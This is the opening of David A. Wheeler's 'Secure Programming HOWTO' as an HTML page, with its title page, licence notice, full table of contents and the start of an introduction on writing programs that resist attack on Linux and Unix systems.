<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd">
<HTML
><HEAD
><TITLE
>Secure Programming HOWTO</TITLE><meta name="viewport" content="width=device-width, initial-scale=1.0><meta name="ignore" content="ignore"
><META
NAME="GENERATOR"
CONTENT="Modular DocBook HTML Stylesheet Version 1.79"><META
NAME="KEYWORD"
CONTENT="secure programming"><META
NAME="KEYWORD"
CONTENT="secure programs"><META
NAME="KEYWORD"
CONTENT="secure applications"><META
NAME="KEYWORD"
CONTENT="secure"><META
NAME="KEYWORD"
CONTENT="programming"><META
NAME="KEYWORD"
CONTENT="security"><META
NAME="KEYWORD"
CONTENT="Linux"><META
NAME="KEYWORD"
CONTENT="Unix"><META
NAME="KEYWORD"
CONTENT="hack"><META
NAME="KEYWORD"
CONTENT="crack"><META
NAME="KEYWORD"
CONTENT="vulnerability"><META
NAME="KEYWORD"
CONTENT="buffer overflow"><META
NAME="KEYWORD"
CONTENT="design"><META
NAME="KEYWORD"
CONTENT="implementation"><META
NAME="KEYWORD"
CONTENT="web application"><META
NAME="KEYWORD"
CONTENT="web applications"><META
NAME="KEYWORD"
CONTENT="CGI"><META
NAME="KEYWORD"
CONTENT="setuid"><META
NAME="KEYWORD"
CONTENT="setgid"><META
NAME="KEYWORD"
CONTENT="C"><META
NAME="KEYWORD"
CONTENT="C++"><META
NAME="KEYWORD"
CONTENT="Java"><META
NAME="KEYWORD"
CONTENT="Perl"><META
NAME="KEYWORD"
CONTENT="PHP"><META
NAME="KEYWORD"
CONTENT="Python"><META
NAME="KEYWORD"
CONTENT="Tcl"><META
NAME="KEYWORD"
CONTENT="Ada"><META
NAME="KEYWORD"
CONTENT="Ada95"></HEAD
><BODY
CLASS="BOOK"
BGCOLOR="#FFFFFF"
TEXT="#000000"
LINK="#0000FF"
VLINK="#840084"
ALINK="#0000FF"
><DIV
CLASS="BOOK"
><A
NAME="AEN1"
></A
><DIV
CLASS="TITLEPAGE"
><H1
CLASS="TITLE"
><A
NAME="AEN2"
>Secure Programming HOWTO</A
></H1
><H3
CLASS="AUTHOR"
><A
NAME="AEN4"
></A
>David A. Wheeler</H3
><P
CLASS="COPYRIGHT"
>Copyright &copy; 1999, 2000, 2001, 2002, 2003, 2004, 2015 David A. Wheeler</P
><P
CLASS="PUBDATE"
>v3.71, 2015-09-01<BR></P
><DIV
><DIV
CLASS="ABSTRACT"
><P
></P
><A
NAME="AEN30"
></A
><P
>This book provides a set of design and implementation
guidelines for writing secure programs.
Such programs include application programs used as viewers of remote data,
web applications (including CGI scripts),
network servers, and setuid/setgid programs.
Specific guidelines for C, C++, Java, Perl, PHP, Python, Tcl,
and Ada95 are included.
It especially covers Linux and Unix based systems, but much of its
material applies to any system.
For a current version of the book, see
<A
HREF="http://www.dwheeler.com/secure-programs"
TARGET="_top"
>http://www.dwheeler.com/secure-programs</A
></P
><P
></P
></DIV
></DIV
><DIV
CLASS="LEGALNOTICE"
><P
></P
><A
NAME="AEN25"
></A
><P
>This book is Copyright (C) 1999-2015 David A. Wheeler.
Permission is granted to copy, distribute and/or modify
this book under the terms of the GNU Free Documentation License (GFDL),
Version 1.1 or any later version published by the Free Software Foundation;
with the invariant sections being <SPAN
CLASS="QUOTE"
>&#8220;About the Author&#8221;</SPAN
>,
with no Front-Cover Texts, and no Back-Cover texts.
A copy of the license is included in the section entitled
<SPAN
CLASS="QUOTE"
>&#8220;GNU Free Documentation License&#8221;</SPAN
>.
This book is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
The image of the Sallet (ca. 1450)
is provided by the Walters Art Museum in Baltimore, Maryland, at
<A
HREF="http://art.thewalters.org/detail/40677/sallet/"
TARGET="_top"
>http://art.thewalters.org/detail/40677/sallet/</A
>.</P
><P
></P
></DIV
><HR></DIV
><DIV
CLASS="TOC"
><DL
><DT
><B
>Table of Contents</B
></DT
><DT
>1. <A
HREF="#INTRODUCTION"
>Introduction</A
></DT
><DT
>2. <A
HREF="#BACKGROUND"
>Background</A
></DT
><DD
><DL
><DT
>2.1. <A
HREF="#HISTORY"
>History of Unix, Linux, and Open Source / Free Software</A
></DT
><DD
><DL
><DT
>2.1.1. <A
HREF="#UNIX-HISTORY"
>Unix</A
></DT
><DT
>2.1.2. <A
HREF="#FSF-HISTORY"
>Free Software Foundation</A
></DT
><DT
>2.1.3. <A
HREF="#LINUX-HISTORY"
>Linux</A
></DT
><DT
>2.1.4. <A
HREF="#OSS-HISTORY"
>Open Source / Free Software</A
></DT
><DT
>2.1.5. <A
HREF="#LINUX-VS-UNIX"
>Comparing Linux and Unix</A
></DT
></DL
></DD
><DT
>2.2. <A
HREF="#SECURITY-PRINCIPLES"
>Security Principles</A
></DT
><DT
>2.3. <A
HREF="#WHY-WRITE-INSECURE"
>Why do Programmers Write Insecure Code?</A
></DT
><DT
>2.4. <A
HREF="#OPEN-SOURCE-SECURITY"
>Is Open Source Good for Security?</A
></DT
><DD
><DL
><DT
>2.4.1. <A
HREF="#OPEN-SOURCE-SECURITY-EXPERTS"
>View of Various Experts</A
></DT
><DT
>2.4.2. <A
HREF="#OPEN-SOURCE-SECURITY-NOHALT"
>Why Closing the Source Doesn&#8217;t Halt Attacks</A
></DT
><DT
>2.4.3. <A
HREF="#OPEN-SOURCE-SECURITY-SECRETS"
>Why Keeping Vulnerabilities Secret Doesn&#8217;t Make Them Go Away</A
></DT
><DT
>2.4.4. <A
HREF="#OPEN-SOURCE-SECURITY-TROJANS"
>How OSS/FS Counters Trojan Horses</A
></DT
><DT
>2.4.5. <A
HREF="#OPEN-SOURCE-SECURITY-OTHER"
>Other Advantages</A
></DT
><DT
>2.4.6. <A
HREF="#OPEN-SOURCE-SECURITY-BOTTOM-LINE"
>Bottom Line</A
></DT
></DL
></DD
><DT
>2.5. <A
HREF="#TYPES-OF-PROGRAMS"
>Types of Secure Programs</A
></DT
><DT
>2.6. <A
HREF="#PARANOIA"
>Paranoia is a Virtue</A
></DT
><DT
>2.7. <A
HREF="#WHY-WRITE"
>Why Did I Write This Document?</A
></DT
><DT
>2.8. <A
HREF="#SOURCES-OF-GUIDELINES"
>Sources of Design and Implementation Guidelines</A
></DT
><DT
>2.9. <A
HREF="#OTHER-SOURCES"
>Other Sources of Security Information</A
></DT
><DT
>2.10. <A
HREF="#CONVENTIONS"
>Document Conventions</A
></DT
></DL
></DD
><DT
>3. <A
HREF="#FEATURES"
>Summary of Linux and Unix Security Features</A
></DT
><DD
><DL
><DT
>3.1. <A
HREF="#PROCESSES"
>Processes</A
></DT
><DD
><DL
><DT
>3.1.1. <A
HREF="#PROCESS-ATTRIBUTES"
>Process Attributes</A
></DT
><DT
>3.1.2. <A
HREF="#POSIX-CAPABILITIES"
>POSIX Capabilities</A
></DT
><DT
>3.1.3. <A
HREF="#PROCESS-CREATION"
>Process Creation and Manipulation</A
></DT
></DL
></DD
><DT
>3.2. <A
HREF="#FILES"
>Files</A
></DT
><DD
><DL
><DT
>3.2.1. <A
HREF="#FSO-ATTRIBUTES"
>Filesystem Object Attributes</A
></DT
><DT
>3.2.2. <A
HREF="#POSIX-ACLS"
>POSIX Access Control Lists (ACLs)</A
></DT
><DD
><DL
><DT
>3.2.2.1. <A
HREF="#HISTORY-POSIX-ACLS"
>History of POSIX Access Control Lists (ACLs)</A
></DT
><DT
>3.2.2.2. <A
HREF="#STATE-POSIX-ACLS"
>Data used in POSIX Access Control Lists (ACLs)</A
></DT
></DL
></DD
><DT
>3.2.3. <A
HREF="#FSO-INITIAL-VALUES"
>Creation Time Initial Values</A
></DT
><DT
>3.2.4. <A
HREF="#CHANGING-ACLS"
>Changing Access Control Attributes</A
></DT
><DT
>3.2.5. <A
HREF="#USING-ACLS"
>Using Access Control Attributes</A
></DT
><DT
>3.2.6. <A
HREF="#FILESYSTEM-HIERARCHY"
>Filesystem Hierarchy</A
></DT
></DL
></DD
><DT
>3.3. <A
HREF="#SYSV-IPC"
>System V IPC</A
></DT
><DT
>3.4. <A
HREF="#SOCKETS"
>Sockets and Network Connections</A
></DT
><DT
>3.5. <A
HREF="#SIGNALS"
>Signals</A
></DT
><DT
>3.6. <A
HREF="#QUOTAS"
>Quotas and Limits</A
></DT
><DT
>3.7. <A
HREF="#DLLS"
>Dynamically Linked Libraries</A
></DT
><DT
>3.8. <A
HREF="#AUDIT"
>Audit</A
></DT
><DT
>3.9. <A
HREF="#PAM"
>PAM</A
></DT
><DT
>3.10. <A
HREF="#UNIX-EXTENSIONS"
>Specialized Security Extensions for Unix-like Systems</A
></DT
></DL
></DD
><DT
>4. <A
HREF="#REQUIREMENTS"
>Security Requirements</A
></DT
><DD
><DL
><DT
>4.1. <A
HREF="#CC-INTRO"
>Common Criteria Introduction</A
></DT
><DT
>4.2. <A
HREF="#CC-ENVIRONMENT"
>Security Environment and Objectives</A
></DT
><DT
>4.3. <A
HREF="#CC-FUNCTIONAL-REQUIREMENTS"
>Security Functionality Requirements</A
></DT
><DT
>4.4. <A
HREF="#CC-ASSURANCE-REQUIREMENTS"
>Security Assurance Measure Requirements</A
></DT
></DL
></DD
><DT
>5. <A
HREF="#INPUT"
>Validate All Input</A
></DT
><DD
><DL
><DT
>5.1. <A
HREF="#VALIDATION-BASICS"
>Basics of input validation</A
></DT
><DT
>5.2. <A
HREF="#VALIDATION-TOOLS-REGEX"
>Input Validation Tools including Regular Expressions</A
></DT
><DD
><DL
><DT
>5.2.1. <A
HREF="#REGEX-BASICS"
>Introduction to regular expressions</A
></DT
><DT
>5.2.2. <A
HREF="#REGEX-FOR-VALIDATION"
>Using regular expressions for input validation</A
></DT
><DT
>5.2.3. <A
HREF="#REGEX-REDOS"
>Regular expression denial of service (reDOS) attacks</A
></DT
></DL
></DD
><DT
>5.3. <A
HREF="#COMMAND-LINE"
>Command line</A
></DT
><DT
>5.4. <A
HREF="#ENVIRONMENT-VARIABLES"
>Environment Variables</A
></DT
><DD
><DL
><DT
>5.4.1. <A
HREF="#ENV-VARS-DANGEROUS"
>Some Environment Variables are Dangerous</A
></DT
><DT
>5.4.2. <A
HREF="#ENV-STORAGE-DANGEROUS"
>Environment Variable Storage Format is Dangerous</A
></DT
><DT
>5.4.3. <A
HREF="#ENV-VAR-SOLUTION"
>The Solution - Extract and Erase</A
></DT
><DT
>5.4.4. <A
HREF="#ENV-VAR-DONTSET"
>Don&#8217;t Let Users Set Their Own Environment Variables</A
></DT
></DL
></DD
><DT
>5.5. <A
HREF="#FILE-DESCRIPTORS"
>File Descriptors</A
></DT
><DT
>5.6. <A
HREF="#FILE-NAMES"
>File Names</A
></DT
><DT
>5.7. <A
HREF="#FILE-CONTENTS"
>File Contents</A
></DT
><DT
>5.8. <A
HREF="#WEB-APPS"
>Web-Based Application Inputs (Especially CGI Scripts)</A
></DT
><DT
>5.9. <A
HREF="#OTHER-INPUTS"
>Other Inputs</A
></DT
><DT
>5.10. <A
HREF="#LOCALE"
>Human Language (Locale) Selection</A
></DT
><DD
><DL
><DT
>5.10.1. <A
HREF="#HOW-LOCALES-SELECTED"
>How Locales are Selected</A
></DT
><DT
>5.10.2. <A
HREF="#LOCALE-SUPPORT-MECHANISMS"
>Locale Support Mechanisms</A
></DT
><DT
>5.10.3. <A
HREF="#LOCALE-LEGAL-VALUES"
>Legal Values</A
></DT
><DT
>5.10.4. <A
HREF="#LOCALE-BOTTOM-LINE"
>Bottom Line</A
></DT
></DL
></DD
><DT
>5.11. <A
HREF="#CHARACTER-ENCODING"
>Character Encoding</A
></DT
><DD
><DL
><DT
>5.11.1. <A
HREF="#CHARACTER-ENCODING-INTRO"
>Introduction to Character Encoding</A
></DT
><DT
>5.11.2. <A
HREF="#CHARACTER-ENCODING-UTF8"
>Introduction to UTF-8</A
></DT
><DT
>5.11.3. <A
HREF="#UTF8-SECURITY-ISSUES"
>UTF-8 Security Issues</A
></DT
><DT
>5.11.4. <A
HREF="#UTF8-LEGAL-VALUES"
>UTF-8 Legal Values</A
></DT
><DT
>5.11.5. <A
HREF="#UTF8-RELATED-ISSUES"
>UTF-8 Related Issues</A
></DT
></DL
></DD
><DT
>5.12. <A
HREF="#INPUT-PROTECTION-CROSS-SITE"
>Prevent Cross-site Malicious Content on Input</A
></DT
><DT
>5.13. <A
HREF="#FILTER-HTML"
>Filter HTML/URIs That May Be Re-presented</A
></DT
><DD
><DL
><DT
>5.13.1. <A
HREF="#REMOVE-HTML-TAGS"
>Remove or Forbid Some HTML Data</A
></DT
><DT
>5.13.2. <A
HREF="#ENCODING-HTML-TAGS"
>Encoding HTML Data</A
></DT
><DT
>5.13.3. <A
HREF="#VALIDATING-HTML-TAGS"
>Validating HTML Data</A
></DT
><DT
>5.13.4. <A
HREF="#VALIDATING-URIS"
>Validating Hypertext Links (URIs/URLs)</A
></DT
><DT
>5.13.5. <A
HREF="#OTHER-HTML-TAGS"
>Other HTML tags</A
></DT
><DT
>5.13.6. <A
HREF="#RELATED-ISSUES"
>Related Issues</A
></DT
></DL
></DD
><DT
>5.14. <A
HREF="#AVOID-GET-NON-QUERIES"
>Forbid HTTP GET To Perform Non-Queries</A
></DT
><DT
>5.15. <A
HREF="#COUNTER-SPAM"
>Counter SPAM</A
></DT
><DT
>5.16. <A
HREF="#LIMIT-TIME"
>Limit Valid Input Time and Load Level</A
></DT
></DL
></DD
><DT
>6. <A
HREF="#BUFFER-OVERFLOW"
>Restrict Operations to Buffer Bounds (Avoid Buffer Overflow)</A
></DT
><DD
><DL
><DT
>6.1. <A
HREF="#DANGERS-C"
>Dangers in C/C++</A
></DT
><DT
>6.2. <A
HREF="#LIBRARY-C"
>Library Solutions in C/C++</A
></DT
><DD
><DL
><DT
>6.2.1. <A
HREF="#BUFFER-STANDARD-SOLUTION"
>Standard C Library Solution</A
></DT
><DT
>6.2.2. <A
HREF="#STATIC-VS-DYNAMIC-BUFFERS"
>Static and Dynamically Allocated Buffers</A
></DT
><DT
>6.2.3. <A
HREF="#STRLCPY"
>strlcpy and strlcat</A
></DT
><DT
>6.2.4. <A
HREF="#ASPRINTF"
>asprintf and vasprintf</A
></DT
><DT
>6.2.5. <A
HREF="#LIBMIB"
>libmib</A
></DT
><DT
>6.2.6. <A
HREF="#SAFESTR"
>Safestr library (Messier and Viega)</A
></DT
><DT
>6.2.7. <A
HREF="#STD-STRING"
>C++ std::string class</A
></DT
><DT
>6.2.8. <A
HREF="#LIBSAFE"
>Libsafe</A
></DT
><DT
>6.2.9. <A
HREF="#OTHER-BUFFER-LIBRARIES"
>Other Libraries</A
></DT
></DL
></DD
><DT
>6.3. <A
HREF="#COMPILATION-C"
>Compilation Solutions in C/C++</A
></DT
><DT
>6.4. <A
HREF="#OTHER-LANGUAGES"
>Other Languages</A
></DT
></DL
></DD
><DT
>7. <A
HREF="#INTERNALS"
>Design Your Program for Security</A
></DT
><DD
><DL
><DT
>7.1. <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
></DT
><DT
>7.2. <A
HREF="#SECURE-INTERFACE"
>Secure the Interface</A
></DT
><DT
>7.3. <A
HREF="#DATA-VS-CONTROL"
>Separate Data and Control</A
></DT
><DT
>7.4. <A
HREF="#MINIMIZE-PRIVILEGES"
>Minimize Privileges</A
></DT
><DD
><DL
><DT
>7.4.1. <A
HREF="#MIMIMIZE-PRIVILEGES-GRANTED"
>Minimize the Privileges Granted</A
></DT
><DT
>7.4.2. <A
HREF="#MINIMIZE-TIME-PRIVILEGE-USABLE"
>Minimize the Time the Privilege Can Be Used</A
></DT
><DT
>7.4.3. <A
HREF="#MINIMIZE-TIME-PRIVILEGE-ACTIVE"
>Minimize the Time the Privilege is Active</A
></DT
><DT
>7.4.4. <A
HREF="#MINIMIZE-PRIVILEGED-MODULES"
>Minimize the Modules Granted the Privilege</A
></DT
><DT
>7.4.5. <A
HREF="#CONSIDER-FSUID"
>Consider Using FSUID To Limit Privileges</A
></DT
><DT
>7.4.6. <A
HREF="#CONSIDER-CHROOT"
>Consider Using Chroot to Minimize Available Files</A
></DT
><DT
>7.4.7. <A
HREF="#MINIMIZE-ACCESSIBLE-DATA"
>Consider Minimizing the Accessible Data</A
></DT
><DT
>7.4.8. <A
HREF="#MINIMIZE-RESOURCES"
>Consider Minimizing the Resources Available</A
></DT
></DL
></DD
><DT
>7.5. <A
HREF="#MINIMIZE-FUNCTIONALITY"
>Minimize the Functionality of a Component</A
></DT
><DT
>7.6. <A
HREF="#AVOID-SETUID"
>Avoid Creating Setuid/Setgid Scripts</A
></DT
><DT
>7.7. <A
HREF="#SAFE-CONFIGURE"
>Configure Safely and Use Safe Defaults</A
></DT
><DT
>7.8. <A
HREF="#INIT-SAFE"
>Load Initialization Values Safely</A
></DT
><DT
>7.9. <A
HREF="#MINIMIZE-DATA-ACCESS"
>Minimize the Accessible Data</A
></DT
><DT
>7.10. <A
HREF="#FAIL-SAFE"
>Fail Safe</A
></DT
><DT
>7.11. <A
HREF="#AVOID-RACE"
>Avoid Race Conditions</A
></DT
><DD
><DL
><DT
>7.11.1. <A
HREF="#NON-ATOMIC"
>Sequencing (Non-Atomic) Problems</A
></DT
><DD
><DL
><DT
>7.11.1.1. <A
HREF="#ATOMIC-FILESYSTEM"
>Atomic Actions in the Filesystem</A
></DT
><DT
>7.11.1.2. <A
HREF="#TEMPORARY-FILES"
>Temporary Files</A
></DT
></DL
></DD
><DT
>7.11.2. <A
HREF="#LOCKING"
>Locking</A
></DT
><DD
><DL
><DT
>7.11.2.1. <A
HREF="#LOCKING-USING-FILES"
>Using Files as Locks</A
></DT
><DT
>7.11.2.2. <A
HREF="#OTHER-LOCKING"
>Other Approaches to Locking</A
></DT
></DL
></DD
></DL
></DD
><DT
>7.12. <A
HREF="#TRUSTWORTHY-CHANNELS"
>Trust Only Trustworthy Channels</A
></DT
><DT
>7.13. <A
HREF="#TRUSTED-PATH"
>Set up a Trusted Path</A
></DT
><DT
>7.14. <A
HREF="#INTERNAL-CHECK"
>Use Internal Consistency-Checking Code</A
></DT
><DT
>7.15. <A
HREF="#SELF-LIMIT-RESOURCES"
>Self-limit Resources</A
></DT
><DT
>7.16. <A
HREF="#CROSS-SITE-MALICIOUS-CONTENT"
>Prevent Cross-Site (XSS) Malicious Content</A
></DT
><DD
><DL
><DT
>7.16.1. <A
HREF="#EXPLAIN-CROSS-SITE"
>Explanation of the Problem</A
></DT
><DT
>7.16.2. <A
HREF="#SOLUTIONS-CROSS-SITE"
>Solutions to Cross-Site Malicious Content</A
></DT
><DD
><DL
><DT
>7.16.2.1. <A
HREF="#AEN2182"
>Identifying Special Characters</A
></DT
><DT
>7.16.2.2. <A
HREF="#AEN2223"
>Filtering</A
></DT
><DT
>7.16.2.3. <A
HREF="#AEN2231"
>Encoding (Quoting)</A
></DT
></DL
></DD
></DL
></DD
><DT
>7.17. <A
HREF="#SEMANTIC-ATTACKS"
>Foil Semantic Attacks</A
></DT
><DT
>7.18. <A
HREF="#CAREFUL-TYPING"
>Be Careful with Data Types</A
></DT
><DT
>7.19. <A
HREF="#COMPLEXITY-ATTACKS"
>Avoid Algorithmic Complexity Attacks</A
></DT
></DL
></DD
><DT
>8. <A
HREF="#CALL-OUT"
>Carefully Call Out to Other Resources</A
></DT
><DD
><DL
><DT
>8.1. <A
HREF="#CALL-ONLY-SAFE"
>Call Only Safe Library Routines</A
></DT
><DT
>8.2. <A
HREF="#LIMIT-CALL-OUTS"
>Limit Call-outs to Valid Values</A
></DT
><DT
>8.3. <A
HREF="#HANDLE-METACHARACTERS"
>Handle Metacharacters</A
></DT
><DD
><DL
><DT
>8.3.1. <A
HREF="#SQL-INJECTION"
>SQL injection</A
></DT
><DT
>8.3.2. <A
HREF="#SHELL-INJECTION"
>Shell injection</A
></DT
><DT
>8.3.3. <A
HREF="#FILENAMES"
>Problematic pathnames and filenames</A
></DT
><DT
>8.3.4. <A
HREF="#OTHER-INJECTION"
>Other injection issues</A
></DT
></DL
></DD
><DT
>8.4. <A
HREF="#CALL-INTENTIONAL-APIS"
>Call Only Interfaces Intended for Programmers</A
></DT
><DT
>8.5. <A
HREF="#CHECK-RETURNS"
>Check All System Call Returns</A
></DT
><DT
>8.6. <A
HREF="#AVOID-VFORK"
>Avoid Using vfork(2)</A
></DT
><DT
>8.7. <A
HREF="#EMBEDDED-CONTENT-BUGS"
>Counter Web Bugs When Retrieving Embedded Content</A
></DT
><DT
>8.8. <A
HREF="#HIDE-SENSITIVE-INFORMATION"
>Hide Sensitive Information</A
></DT
></DL
></DD
><DT
>9. <A
HREF="#OUTPUT"
>Send Information Back Judiciously</A
></DT
><DD
><DL
><DT
>9.1. <A
HREF="#MINIMIZE-FEEDBACK"
>Minimize Feedback</A
></DT
><DT
>9.2. <A
HREF="#NO-COMMENTS"
>Don&#8217;t Include Comments</A
></DT
><DT
>9.3. <A
HREF="#HANDLE-FULL-OUTPUT"
>Handle Full/Unresponsive Output</A
></DT
><DT
>9.4. <A
HREF="#CONTROL-FORMATTING"
>Control Data Formatting (Format Strings)</A
></DT
><DT
>9.5. <A
HREF="#OUTPUT-CHARACTER-ENCODING"
>Control Character Encoding in Output</A
></DT
><DT
>9.6. <A
HREF="#PREVENT-INCLUDE-ACCESS"
>Prevent Include/Configuration File Access</A
></DT
></DL
></DD
><DT
>10. <A
HREF="#LANGUAGE-SPECIFIC"
>Language-Specific Issues</A
></DT
><DD
><DL
><DT
>10.1. <A
HREF="#C-CPP"
>C/C++</A
></DT
><DT
>10.2. <A
HREF="#PERL"
>Perl</A
></DT
><DT
>10.3. <A
HREF="#PYTHON"
>Python</A
></DT
><DT
>10.4. <A
HREF="#SHELL"
>Shell Scripting Languages (sh and csh Derivatives)</A
></DT
><DT
>10.5. <A
HREF="#ADA"
>Ada</A
></DT
><DT
>10.6. <A
HREF="#JAVA"
>Java</A
></DT
><DT
>10.7. <A
HREF="#TCL"
>Tcl</A
></DT
><DT
>10.8. <A
HREF="#PHP"
>PHP</A
></DT
></DL
></DD
><DT
>11. <A
HREF="#SPECIAL"
>Special Topics</A
></DT
><DD
><DL
><DT
>11.1. <A
HREF="#PASSWORDS"
>Passwords</A
></DT
><DT
>11.2. <A
HREF="#WEB-AUTHENTICATION"
>Authenticating on the Web</A
></DT
><DD
><DL
><DT
>11.2.1. <A
HREF="#WEB-AUTHENTICATION-LOGIN"
>Authenticating on the Web: Logging In</A
></DT
><DT
>11.2.2. <A
HREF="#WEB-AUTHENTICATION-SUBSEQUENT"
>Authenticating on the Web: Subsequent Actions</A
></DT
><DT
>11.2.3. <A
HREF="#WEB-AUTHENTICATION-LOGOUT"
>Authenticating on the Web: Logging Out</A
></DT
></DL
></DD
><DT
>11.3. <A
HREF="#RANDOM-NUMBERS"
>Random Numbers</A
></DT
><DT
>11.4. <A
HREF="#PROTECT-SECRETS"
>Specially Protect Secrets (Passwords and Keys) in User Memory</A
></DT
><DT
>11.5. <A
HREF="#CRYPTO"
>Cryptographic Algorithms and Protocols</A
></DT
><DD
><DL
><DT
>11.5.1. <A
HREF="#CRYPTO-PROTOCOLS"
>Cryptographic Protocols</A
></DT
><DT
>11.5.2. <A
HREF="#SYMMETRIC-ENCRYPTION"
>Symmetric Key Encryption Algorithms</A
></DT
><DT
>11.5.3. <A
HREF="#PUBLIC-KEY-ENCRYPTION"
>Public Key Algorithms</A
></DT
><DT
>11.5.4. <A
HREF="#HASH"
>Cryptographic Hash Algorithms</A
></DT
><DT
>11.5.5. <A
HREF="#INTEGRITY-CHECK"
>Integrity Checking</A
></DT
><DT
>11.5.6. <A
HREF="#RMAC"
>Randomized Message Authentication Mode (RMAC)</A
></DT
><DT
>11.5.7. <A
HREF="#CRYPTO-OTHER"
>Other Cryptographic Issues</A
></DT
></DL
></DD
><DT
>11.6. <A
HREF="#USE-PAM"
>Using PAM</A
></DT
><DT
>11.7. <A
HREF="#TOOLS"
>Tools</A
></DT
><DT
>11.8. <A
HREF="#WINDOWS-CE"
>Windows CE</A
></DT
><DT
>11.9. <A
HREF="#WRITE-AUDIT-RECORDS"
>Write Audit Records</A
></DT
><DT
>11.10. <A
HREF="#PHYSICAL-EMISSIONS"
>Physical Emissions</A
></DT
><DT
>11.11. <A
HREF="#MISCELLANEOUS"
>Miscellaneous</A
></DT
></DL
></DD
><DT
>12. <A
HREF="#CONCLUSION"
>Conclusion</A
></DT
><DT
>13. <A
HREF="#BIBLIOGRAPHY"
>Bibliography</A
></DT
><DT
>A. <A
HREF="#DOCUMENT-HISTORY"
>History</A
></DT
><DT
>B. <A
HREF="#ACKNOWLEDGEMENTS"
>Acknowledgements</A
></DT
><DT
>C. <A
HREF="#ABOUT-LICENSE"
>About the Documentation License</A
></DT
><DT
>D. <A
HREF="#FDL"
>GNU Free Documentation License</A
></DT
><DT
>E. <A
HREF="#ENDORSEMENTS"
>Endorsements</A
></DT
><DT
>F. <A
HREF="#ABOUT-AUTHOR"
>About the Author</A
></DT
><DT
><A
HREF="#AEN3922"
>Index</A
></DT
></DL
></DIV
><DIV
CLASS="LOT"
><DL
CLASS="LOT"
><DT
><B
>List of Tables</B
></DT
><DT
>3-1. <A
HREF="#AEN687"
>POSIX ACL Entry Types</A
></DT
><DT
>5-1. <A
HREF="#AEN1327"
>Legal UTF-8 Sequences</A
></DT
></DL
></DIV
><DIV
CLASS="LOT"
><DL
CLASS="LOT"
><DT
><B
>List of Figures</B
></DT
><DT
>1-1. <A
HREF="#ABSTRACT-PROGRAM"
>Abstract View of a Program</A
></DT
><DT
>6-1. <A
HREF="#TRAIN-OVERFLOW-BUFFER"
>A physical buffer overflow: The Montparnasse derailment of 1895</A
></DT
></DL
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="INTRODUCTION"
></A
>Chapter 1. Introduction</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>A wise man attacks the city of the mighty
and pulls down the stronghold in which they trust.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Proverbs 21:22 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>This book describes a set of guidelines for
writing secure programs.
For purposes of this book, a <SPAN
CLASS="QUOTE"
>&#8220;secure program&#8221;</SPAN
> is a program
that sits on a security boundary, taking input from a source that does
not have the same access rights as the program.
Such programs include application programs used as viewers of remote data,
web applications (including CGI scripts),
network servers, and setuid/setgid programs.
This book does not address modifying the operating system kernel itself,
although many of the principles discussed here do apply.
These guidelines were developed as a survey of
<SPAN
CLASS="QUOTE"
>&#8220;lessons learned&#8221;</SPAN
> from various sources on how to create such programs
(along with additional observations by the author),
reorganized into a set of larger principles.
This book includes specific guidance for a number of languages,
including C, C++, Java, Perl, PHP, Python, Tcl, and Ada95.
It especially covers Linux and Unix based systems, but much of its
material applies to any system.</P
><P
>Why read this book?
Because today, programs are under attack.
Techniques such as constantly patching systems and training users
in computer security are simply not enough to counter computer attacks.
The <A
HREF="http://www.caida.org/analysis/security/witty/"
TARGET="_top"
>Witty worm of 2004</A
>, for example,
demonstrated that depending on patches "failed spectacularly"
because attackers could deploy attacks faster than users could install
patches (the attack began one day after the patch was announced,
and only 45 minutes later most vulnerable systems were invected).
The Witty worm also demonstrated that deploying proactive measures wasn&#8217;t
enough: all attackees had at least installed a firewall.
Long ago, putting a fence around a computer eliminated most threats.
Today, most programs have network connections or take data
sent through a network (and possibly from an attacker), and other
defensive measures simply haven&#8217;t been able to counter attackers.
Thus, all software developers must know how to counter attacks.</P
><P
>You can find the master copy of this book at
<A
HREF="http://www.dwheeler.com/secure-programs"
TARGET="_top"
>http://www.dwheeler.com/secure-programs</A
>.
This book is also part of the Linux Documentation Project (LDP) at
<A
HREF="http://www.tldp.org"
TARGET="_top"
>http://www.tldp.org</A
>
It&#8217;s also mirrored in several other places.
Please note that these mirrors, including the LDP copy and/or the
copy in your distribution, may be older than the master copy.
I&#8217;d like to hear comments on this book, but please do not send comments
until you&#8217;ve checked to make sure that your comment is valid for the
latest version.</P
><P
>This book does not cover assurance measures, software engineering
processes, and quality assurance approaches,
which are important but widely discussed elsewhere.
Such measures include testing, peer review,
configuration management, and formal methods.
Documents specifically identifying sets of development
assurance measures for security issues include
the Common Criteria (CC, [CC 1999]) and the
Systems Security Engineering Capability Maturity Model [SSE-CMM 1999].
Inspections and other peer review techniques are discussed in
[Wheeler 1996].
This book does briefly discuss ideas from the CC, but only as an organizational
aid to discuss security requirements.
More general sets of software engineering processes
are defined in documents such as the
Software Engineering Institute&#8217;s Capability Maturity Model for Software
(SW-CMM) [Paulk 1993a, 1993b]
and ISO 12207 [ISO 12207].
General international standards for quality systems are defined in
ISO 9000 and ISO 9001 [ISO 9000, 9001].
&#13;</P
><P
>This book does not discuss how to configure a system (or network)
to be secure in a given environment. This is clearly necessary for
secure use of a given program,
but a great many other documents discuss secure configurations.
An excellent general book on configuring Unix-like systems to be
secure is Garfinkel [1996].
Other books for securing Unix-like systems include Anonymous [1998].
You can also find information on configuring Unix-like systems at web sites
such as
<A
HREF="http://www.unixtools.com/security.html"
TARGET="_top"
>http://www.unixtools.com/security.html</A
>.
Information on configuring a Linux system to be secure is available in a
wide variety of documents including
Fenzi [1999], Seifried [1999], Wreski [1998], Swan [2001],
and Anonymous [1999].
Geodsoft [2001] describes how to harden OpenBSD,
and many of its suggestions are useful for any Unix-like system.
